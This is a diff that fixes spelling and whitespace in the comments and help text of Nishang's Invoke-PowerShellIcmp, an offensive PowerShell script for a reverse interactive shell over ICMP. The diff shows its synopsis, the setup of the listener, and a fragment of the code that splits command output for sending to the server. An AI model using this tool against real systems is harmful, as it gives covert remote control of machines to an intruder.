@@ -2,7 +2,7 @@ function Invoke-PowerShellIcmp
 { 
 <#
 .SYNOPSIS
-Nishang script which can be used for a Reverse interactive PowerShell from a target over ICMP. 
+Nishang script which can be used for a Reverse interactive PowerShell from a target over ICMP.
 
 .DESCRIPTION
 This script can receive commands from a server, execute them and return the result to the server using only ICMP.
@@ -16,7 +16,7 @@ The IP address of the server/listener to connect to.
 Time in seconds for which the script waits for a command from the server. Default is 5 seconds. 
 
 .PARAMETER BufferSize
-The size of output Buffer. Defualt is 128.
+The size of output buffer. Default is 128.
 
 .EXAMPLE
 # sysctl -w net.ipv4.icmp_echo_ignore_all=1
@@ -78,7 +78,7 @@ https://github.com/samratashok/nishang
             $index = [math]::floor($sendbytes.length/$BufferSize)
             $i = 0
 
-            #Fragmant larger output into smaller ones to send to the server.
+            #Fragment larger output into smaller ones to send to the server.
             if ($sendbytes.length -gt $BufferSize)
             {
                 while ($i -lt $index )
